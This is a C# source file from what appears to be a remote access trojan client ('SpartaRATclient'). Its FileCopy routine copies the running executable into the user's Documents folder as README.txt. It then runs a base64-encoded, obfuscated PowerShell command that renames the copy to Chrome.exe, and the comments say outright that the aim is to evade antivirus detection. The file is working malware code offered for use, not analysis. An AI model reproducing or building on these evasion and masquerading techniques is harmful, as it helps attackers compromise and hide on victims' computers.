using SpartaRATclient.Tools;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient
{
    public class FileCopy
    {
        //File copy
        public static String This()
        {
            //copy the exe file to new path as txt file to make it harder for the anti virus to detect this as a malware
            string NewPath = @"C:\Users\" + Environment.UserName + @"\Documents\README.txt";
            FileInfo fileInfo = new FileInfo(NewPath);
            if (!fileInfo.Exists)
            {
                try
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, NewPath, true);
                    //copy the README.txt file into chrome.exe file using powershell encodings to make it harder for the anti virus to detect us. I used the OG tool "Invoke-Obfuscation" by danielbohannon.
                    //original command: copy "C:\Users\$env:username\Documents\README.txt" "C:\Users\$env:username\Documents\Chrome.exe"
                    //I encoded the obfuscated powershell code with base64: "& ( '{0}{1}' -f 'c',('op' +  'y' ) ) \"C:\Users\$env:username\Documents\README.txt\" \"C:\Users\$env:username\Documents\Chrome.exe\""
                    //The base64: IiYgKCAnezB9ezF9JyAtZiAnYycsKCdvcCcgKyAgJ3knICkgKSBcIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXFJFQURNRS50eHRcIiBcIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXENocm9tZS5leGVcIiI=
                    Shell.Run(Encoding.UTF8.GetString(Convert.FromBase64String("IiYgKCAnezB9ezF9JyAtZiAnYycsKCdvcCcgKyAgJ3knICkgKSBcIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXFJFQURNRS50eHRcIiBcIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXENocm9tZS5leGVcIiI=")), 10000);
                }
                catch (Exception r)
                {
                    //@TODO: Send errors to server
                }
            }
            else
                return "exist";
            return NewPath;
        }
    }
}
